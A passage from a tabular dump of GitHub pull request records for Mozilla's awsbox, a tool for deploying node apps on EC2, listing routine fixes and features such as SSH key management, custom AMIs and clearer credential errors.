",nnam,2849214,2013-06-02T22:15:11Z,CONTRIBUTOR,True,63,33,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,04bb223baa6379e33011224ca04d146ace2f7f24,"Fixed addSSHPubKey so it properly escapes public keys and
removeSSHPubKey properly removes public keys"
89,https://api.github.com/repos/mozilla/awsbox/pulls/68,68,Pass user data from the command line,"Feature from Issue #67
",spitimage,1820846,2013-05-27T21:37:25Z,CONTRIBUTOR,True,7,2,2,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,efb6d67635f5351b31479f2dfd615a24d00c25bd,Pass user data from the command line
90,https://api.github.com/repos/mozilla/awsbox/pulls/66,66,added --save-dev,"added --save-dev to be able to skip a step.
",lvnilesh,93558,2013-05-23T05:12:44Z,CONTRIBUTOR,True,2,0,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,2bc511923ed92b3676e4c15c0a6ead803a2abca6,"added --save-dev

added save-dev flag to"
91,https://api.github.com/repos/mozilla/awsbox/pulls/65,65,"Add optional ""ami"" property to .awsbox.json","Allows you to specify a custom AMI base image. With no ""ami"" set `awsbox create` will use the default AMI (ami-8af096e3)
### Example:

``` json
{
  ""ami"": ""ami-6f690106"",
  ""processes"": [
    ""helloworld.js""
  ]
}
```
",dannycoates,87619,2013-05-22T17:55:20Z,MEMBER,True,20,5,3,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,21a45870fcc895708094834e9faf6ef90a923307,"added an optional ""ami"" property to .awsbox.json"
92,https://api.github.com/repos/mozilla/awsbox/pulls/58,58,Added clearer error when missing env vars for aws credentials.,"Before this change the error looks like.

```
$ node awsbox.js zones
fatal error: error running 'zones' command: secretAccessKey and accessKeyId must be set
```

After change.

```
fatal error: Missing aws credentials
Please configure the AWS_ID and AWS_KEY environment variables.
```

Makes it a little clearer to the user what they need to correct :smile: and does it before entering any other code.

Cheers
",wolfeidau,50636,2013-05-11T00:43:53Z,CONTRIBUTOR,True,3,0,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,e748021397a7c203cec15fc54fce7b5ef341a20d,Added clearer error when missing env vars for aws credentials.
93,https://api.github.com/repos/mozilla/awsbox/pulls/57,57,Fix error codes that are sent to callbacks on git errors,"When the gitc library functions are called, if they error out, they currently always call the callback with a value of 0 which means we can't detect if errors actually happened or not. This fixes it so we get a true or false value to the callback.
",Standard8,520844,2013-05-02T21:52:23Z,MEMBER,True,3,3,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,ca0569b72cc2fdd9a6e8245b6ed09d902b0b2f76,Fix error codes that are sent to callbacks on git errors
94,https://api.github.com/repos/mozilla/awsbox/pulls/56,56,replace undefined checkErr function,"So you don't get:

```
reading .awsbox.json
fatal error: error running 'create' command: ReferenceError: checkErr is not defined
```

Seems easier just to inline the function code than to make a separate utils module to import checkErr from.
",jedp,532953,2013-04-12T16:51:31Z,CONTRIBUTOR,True,2,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,1a28b05b83550606922609ecef529c43cd6535bd,replace undefined checkErr function
95,https://api.github.com/repos/mozilla/awsbox/pulls/55,55,[COLORS] - added colors to logged messages,"Probably need to define helper methods for display ""Errors"", ""Info"" and ""Warning""'s with the proper color and probably need to define some basic colors to use. I found it was easier to follow the awsbox steps.
",StephaneP,147035,2013-04-09T05:54:02Z,NONE,True,59,46,2,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,72ada6dd0335b842f1d4514662c2b6bfc1997b4c,[COLORS] - added colors to logged messages
96,https://api.github.com/repos/mozilla/awsbox/pulls/49,49,Add -g option to use custom security group name,"After the instance is created, you can't change security groups, so something like this is needed if you don't want your awsboxen to all share the same security group.

This approach assumes the developer will manage the security group settings through some other means (web ui or java api tools).

I have another patch stashed away that takes the security group from the config file and lets the developer pass through the settings when creating the group, let me know if you'd rather go that route.
",kparlante,1069143,2013-03-09T23:14:10Z,CONTRIBUTOR,True,6,4,3,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,1d740b195b8a9c6d6825232c88b6695ae814d80f,Add ability to pass in security group name
97,https://api.github.com/repos/mozilla/awsbox/pulls/48,48,Typo,,gurjeet,159099,2013-02-21T13:10:05Z,CONTRIBUTOR,True,1,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,3bd06b4db766c3a3637aaaf11bcb2939fed36c3c,Typo
98,https://api.github.com/repos/mozilla/awsbox/pulls/46,46,exists and existsSync moved from path to fs libs.,"Using existsSync from fs if it is present. This should still support older versions, though I only tested with node v0.4.7 and v0.8.15
",simonwex,25260,2013-01-23T21:10:49Z,MEMBER,True,7,4,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,4467e81042c740819f567a1e304acfda9ce1ea5a,"Changed path.exists to fs.exists, to be compatible with node >v0.7. Also supporting backwards-compatibility."
99,https://api.github.com/repos/mozilla/awsbox/pulls/45,45,Small documentation fix,"Links were still referencing https://github.com/lloyd/awsbox/

Should be https://github.com/mozilla/awsbox/
",lorcanmcdonald,44857,2013-01-16T11:00:45Z,CONTRIBUTOR,True,2,2,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,5b555f8609d684512b0f826bfb372ee180ba2118,"Fixed links to documentation in README.md

Links were still referencing https://github.com/lloyd/awsbox/

Should be https://github.com/mozilla/awsbox/"
100,https://api.github.com/repos/mozilla/awsbox/pulls/42,42,"Added ssh key management commands: listkeys, addkey, removekey","`awsbox listkeys instanceNameOrId` cats the `authorized_keys` file

`awsbox addkey nameOrId /path/to/keyfile.rsa.pub` adds each of the keys in the keyfile that is not already in the `authorized_keys` file.

`awsbox removekey nameOrId /path/to/keyfile.rsa.pub` removes each of the keys in the keyfile that is not already in the `authorized_keys` file.
",jedp,532953,2012-11-15T02:28:55Z,CONTRIBUTOR,True,167,7,4,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,603bd56b106cb2a766ac6eb497523be06d32c1d9,"Added commands (verbs): listkeys, addkey, removekey"
101,https://api.github.com/repos/mozilla/awsbox/pulls/40,40,"Add two new features - local_hooks and an ""update"" verb.","local_hooks are hooks that allow the user to run scripts on the local machine at specified points in the process.

The update verb does a git push to the instance and then runs the poststart local hook.
",shane-tomlinson,848085,2012-10-30T16:19:09Z,MEMBER,True,27,7,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,ccf1872648a89132848e215da1038429f0082494,"Adding the notion of local_hooks to run on the local host. The only local_hook is ""postcreate"" which is run after the vm is created."
102,https://api.github.com/repos/mozilla/awsbox/pulls/40,40,"Add two new features - local_hooks and an ""update"" verb.","local_hooks are hooks that allow the user to run scripts on the local machine at specified points in the process.

The update verb does a git push to the instance and then runs the poststart local hook.
",shane-tomlinson,848085,2012-10-30T16:19:09Z,MEMBER,True,27,7,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,4dc125d776f5b47d50f58cf7fe06fc4e710ac7d1,"Merge branch 'with_update'

Conflicts:
	lib/process.js"
103,https://api.github.com/repos/mozilla/awsbox/pulls/40,40,"Add two new features - local_hooks and an ""update"" verb.","local_hooks are hooks that allow the user to run scripts on the local machine at specified points in the process.

The update verb does a git push to the instance and then runs the poststart local hook.
",shane-tomlinson,848085,2012-10-30T16:19:09Z,MEMBER,True,27,7,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,dcecd025484a49d20998f89de77941a7eebef69e,Pass all environment variables along to the GIT commands. This prevents the user from being asked for their password when pushing to a remote host.
104,https://api.github.com/repos/mozilla/awsbox/pulls/35,35,"when using --keydir, whitelist only files ending in .pub","so for example you could just say `--keydir /path/to/identity-pubkeys` and not get other files
",jedp,532953,2012-09-13T20:38:42Z,CONTRIBUTOR,True,6,2,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,850ded6432d719e79dae6330aa4a4e8cf897a3b0,"when using --keydir, whitelist only files ending in .pub"
105,https://api.github.com/repos/mozilla/awsbox/pulls/34,34,how-to for intermediate SSL certificate chaining,"useful if, like me, you get your certs from gandi or another non-root provider
",jedp,532953,2012-09-12T23:03:17Z,CONTRIBUTOR,False,29,2,2,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,36a1cf59e0c824697acdde5fee74b1c9956808d6,docs for chaining intermediate ssl certs
106,https://api.github.com/repos/mozilla/awsbox/pulls/34,34,how-to for intermediate SSL certificate chaining,"useful if, like me, you get your certs from gandi or another non-root provider
",jedp,532953,2012-09-12T23:03:17Z,CONTRIBUTOR,False,29,2,2,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,6679cec03b4f680d996d549cc1769366d47a3a46,"when using --keydir, whitelist only *.pub files"
107,https://api.github.com/repos/mozilla/awsbox/pulls/31,31,AWSBOX_PUBKEY env var,,seanmonstar,51479,2012-08-27T22:36:16Z,MEMBER,True,1,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,107046a7acf9785eb80d6e3dd7845708d6aadb9c,add AWSBOX_PUBKEY env var
108,https://api.github.com/repos/mozilla/awsbox/pulls/28,28,"Run ""yum clean metadata"" - fixes issue #27","Title says it all :)
",vthunder,435972,2012-07-29T22:38:46Z,CONTRIBUTOR,True,7,3,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,daabd1478c1a629cfc9cc6987dbdf16b58edefd5,run yum clean metadata to prevent stale cached metadata from interfering with vm update step
109,https://api.github.com/repos/mozilla/awsbox/pulls/25,25,Rephrase one of the questions,"I totally overlooked that question when I was looking for a way
to restart my services after hacking the application code.

I probably thought that this question was about rebooting the VM
itself. Not sure, but hopefully this will be clearer.
",fmarier,167821,2012-07-17T03:17:47Z,NONE,True,1,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,8142e0e3382f4f23cc0f8e93b92cac535f9d50f7,"Rephrase one of the questions

I totally overlooked that question when I was looking for a way
to restart my services after hacking the application code.

I probably thought that this question was about rebooting the VM
itself. Not sure, but hopefully this will be clearer."
110,https://api.github.com/repos/mozilla/awsbox/pulls/24,24,Apply system updates after creating and bringing up new instance,"Sorry for the awful diff. I'm really just adding 2-3 lines, but re-indenting that whole function really screws with the readability of this patch :(
",fmarier,167821,2012-07-16T04:14:08Z,NONE,True,52,38,2,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,5c1f7d9abd7539f7eb1cae1173c344c31bafb53b,Apply system updates after creating and bringing up new instance
111,https://api.github.com/repos/mozilla/awsbox/pulls/23,23,Hi! I fixed some code for you!,"Hi!

I am migrationBot!

Did you know that `path.{exists,existsSync}` was moved to `fs.{exists,existsSync}`,  and that `tty.setRawMode(mode)` was moved to `tty.ReadStream#setRawMode()` (i.e. `process.stdin.setRawMode()`)  in node v0.8.0? Read more @[API changes between v0.6 and v0.8](https://github.com/joyent/node/wiki/API-changes-between-v0.6-and-v0.8) 

I automatically made some changes I think will help you migrate your codebase to node v0.8.0, please review these changes and merge them if you feel they are useful, If they are not you can ignore this Pull Request.

Have a Nice Day!

--[migrationBot](https://github.com/blakmatrix/node-migrator-bot)
",node-migrator-bot,1855799,2012-07-07T02:29:47Z,NONE,False,3,3,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,d4a315f8575aef796a81a94563ac50c2d81326d8,[fix] path.existsSync was moved to fs.existsSync
112,https://api.github.com/repos/mozilla/awsbox/pulls/16,16,npm install noted.,,ozten,18924,2012-04-25T02:09:43Z,MEMBER,True,2,0,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,981627c5eeb86b0ba820112452e70a239bc5298f,npm install noted.
